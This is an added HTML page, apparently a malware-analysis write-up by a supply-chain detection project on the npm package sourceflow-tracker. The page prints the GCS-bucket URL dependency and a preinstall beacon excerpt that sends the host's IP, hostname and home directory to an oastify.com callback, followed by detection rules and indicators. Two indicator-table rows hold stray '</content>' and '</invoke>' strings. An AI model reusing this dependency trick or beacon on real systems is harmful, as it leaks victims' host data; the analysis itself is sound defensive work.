@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>sourceflow-tracker: I Has a Bucket — npm fetches its payload from GCS - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="sourceflow-tracker: I Has a Bucket — npm fetches its payload from GCS - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>sourceflow-tracker: I Has a Bucket — npm fetches its payload from GCS</h1>
+    <span class="post-meta">2026-06-02 &middot; npm &middot; sourceflow-tracker</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/sourceflow-tracker-walrus-bucket.jpg" alt="Meme: a walrus guarding a bucket — 'I has a bucket.' Here npm fetches the payload from the attacker's bucket for them.">
+<p>Most malicious npm packages hide the payload in the tarball you install; <code>sourceflow-tracker</code> couldn't be bothered. Its only load-bearing content is a dependency whose version string is a URL into a Google Cloud Storage bucket, so npm does the fetching and npm does the detonating, and the registry never holds a copy to scan. What it retrieves is a verbatim copy of the public <code>network-speed</code> module with a beacon stapled on, phoning the host's internal IP, hostname, and home directory to a Burp Collaborator subdomain — dependency-confusion research from the <a href="/discoveries/2026/05/shop-minis-burp-canary/">shop-minis</a> cluster, only this time the walrus sends npm to fetch its bucket.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>sourceflow-tracker</code></td>
+</tr>
+<tr>
+<td>Version</td>
+<td><code>99.91.9</code></td>
+</tr>
+<tr>
+<td>Author</td>
+<td><code>lslsls</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td><code>lspodcc</code></td>
+</tr>
+<tr>
+<td>License</td>
+<td><code>UNLICENSED</code></td>
+</tr>
+<tr>
+<td>Dependency</td>
+<td><code>ltidisafe</code>: <code>https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-1-%E2%80%94-sourceflow-tracker%3A-the-bucket-dependency" tabindex="-1"><a class="header-anchor" href="#stage-1-%E2%80%94-sourceflow-tracker%3A-the-bucket-dependency"><span>Stage 1 — sourceflow-tracker: the bucket dependency</span></a></h2>
+<p>The published package is an empty suit: a one-line <code>index.js</code>, npm's stock test script, and one dependency entry whose version — normally a semver range — is a raw URL into a public GCS bucket. npm resolves remote-tarball URLs without complaint, so <code>storage.googleapis.com</code> ships stage two: a domain every corporate proxy already waves through, hosting a tarball the operator can swap without touching npm again. cleave carries a rule named for exactly this, a GCS bucket masquerading as a dependency version.</p>
+<pre class="lang-js"><code><span class="tok-com">// sourceflow-tracker package.json — the entire malicious surface</span>
+<span class="tok-str">"dependencies"</span>: {
+  <span class="tok-str">"ltidisafe"</span>: <span class="tok-str">"https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz"</span>
+}
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/dependency/direct-url::dep-bucket-gcs</code></td>
+<td>Dependency value is a GCS bucket URL: <code>storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/dependency/direct-url::url-dep-minimal-metadata</code></td>
+<td>URL dependency paired with skeletal metadata (<code>lspodcc</code>)</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/versioning::npm-version-major-40-plus</code></td>
+<td>Version <code>99.91.9</code> — a dependency-confusion squat signal</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/package/npm::npm-init-default-test</code></td>
+<td>Stock <code>npm init</code> placeholder test script</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-2-%E2%80%94-pack_ux_foundry%3A-the-preinstall-beacon" tabindex="-1"><a class="header-anchor" href="#stage-2-%E2%80%94-pack_ux_foundry%3A-the-preinstall-beacon"><span>Stage 2 — pack_ux_foundry: the preinstall beacon</span></a></h2>
+<p>The tarball is a faithful copy of the public <code>network-speed</code> module with the malware bolted on as a separate <code>test.js</code>, fired from a <code>preinstall</code> hook with its output routed to oblivion. It grabs the host's internal IPv4 (in the clear), hostname, and home directory (both hex-encoded to survive as a DNS label), then exfils each one not through its own HTTP client but by pointing the borrowed library's <code>checkDownloadSpeed</code> at the Collaborator URL — the &quot;speed test&quot; is the exfil. Each value leaves as the leftmost label of <code>&lt;value&gt;.ux-foundry.&lt;collab&gt;.oastify.com</code>, which leaks at DNS resolution whether or not the GET ever lands.</p>
+<pre class="lang-js"><code><span class="tok-com">// pack_ux_foundry test.js — runs from preinstall, beacons three facts</span>
+<span class="tok-kw">const</span> hn = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">hostname</span>());   <span class="tok-com">// hostname, hex'd for a DNS label</span>
+<span class="tok-kw">const</span> hd = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">homedir</span>());   <span class="tok-com">// home dir, hex'd</span>
+<span class="tok-kw">var</span> localip = <span class="tok-fn">getIp</span>(<span class="tok-str">'IPv4'</span>);            <span class="tok-com">// internal IPv4, in clear</span>
+<span class="tok-fn">getNetworkDownloadSpeedData</span>(localip);    <span class="tok-com">// → GET http://&lt;data&gt;.ux-foundry.&lt;collab&gt;.oastify.com</span>
+<span class="tok-fn">getNetworkDownloadSpeedData</span>(hn);
+<span class="tok-fn">getNetworkDownloadSpeedData</span>(hd);
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/install-hook/scripts/lifecycle::silent-obfuscated-npm-dropper</code></td>
+<td><code>preinstall</code> runs <code>node test.js &gt; /dev/null 2&gt;&amp;1</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/exfiltration/dns/tunnel::subdomain-encode</code></td>
+<td>Victim data encoded as the leftmost subdomain label of <code>wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/recon-exfil/dns::dns-lookup-with-canary-domain</code></td>
+<td>Host recon resolved through an <code>oast</code> canary domain</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/exfiltration/oob/endpoint::oastify</code></td>
+<td>Callback host is a Burp Collaborator subdomain on <code>oastify.com</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/supply-chain/recon-exfil/package::npm-victim-id-recon</code></td>
+<td>Collects host identity via <code>os.networkInterfaces</code> and <code>os.homedir</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/supply-chain/trojanized/library/framework::preinstall-hook</code></td>
+<td>A <code>preinstall</code> hook grafted onto a copied library</td>
+</tr>
+</tbody>
+</table>
+<h2 id="same-recipe-as-shop-minis" tabindex="-1"><a class="header-anchor" href="#same-recipe-as-shop-minis"><span>Same recipe as shop-minis</span></a></h2>
+<p>Strip the costume and this is the <a href="/discoveries/2026/05/shop-minis-burp-canary/">shop-minis</a> probe again: dependency-confusion recon beaconed to a Burp Collaborator subdomain, then it politely stops with no stealer or persistence, the only change being that the bucket — not an install hook — carries the bag. The mercy is that this bucket holds a recon ping; the same trick with worse cargo would look identical until somebody re-read the tarball.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stage-0 tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/4e87b803b8e6a18cfef9bb81e186d927081290f7870ab3ce6cf9b4c2eaf81e3e"><code>4e87b803b8e6a18cfef9bb81e186d927081290f7870ab3ce6cf9b4c2eaf81e3e</code></a></td>
+</tr>
+<tr>
+<td>Stage-0 index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/e89c7bb78ab236d8872813fcf9dea56166bcf717f07b264d819223f06c3d9afd"><code>e89c7bb78ab236d8872813fcf9dea56166bcf717f07b264d819223f06c3d9afd</code></a></td>
+</tr>
+<tr>
+<td>Stage-2 package</td>
+<td><code>s.ls.ls.ls@1.0.5</code></td>
+</tr>
+<tr>
+<td>Stage-2 tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/1cc73e93d4577fca7478854b4ada86bc78ed8b83369928fd97b4225809d76b52"><code>1cc73e93d4577fca7478854b4ada86bc78ed8b83369928fd97b4225809d76b52</code></a></td>
+</tr>
+<tr>
+<td>Stage-2 index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/e9105cfb50a1d8d3d8cabbc1a8dfd0a04966d00bbdd8707d65001e930f842bf5"><code>e9105cfb50a1d8d3d8cabbc1a8dfd0a04966d00bbdd8707d65001e930f842bf5</code></a></td>
+</tr>
+<tr>
+<td>Stage-2 test.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/6470d87928dbb2ee3950ec33cbc30d1809bf395fadb98cf0d91d6f6e8115d4b0"><code>6470d87928dbb2ee3950ec33cbc30d1809bf395fadb98cf0d91d6f6e8115d4b0</code></a></td>
+</tr>
+<tr>
+<td>OOB callback</td>
+<td><code>http://&lt;data&gt;.ux-foundry.wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com</code></td>
+</tr>
+<tr>
+<td></content></td>
+<td></td>
+</tr>
+<tr>
+<td></invoke></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
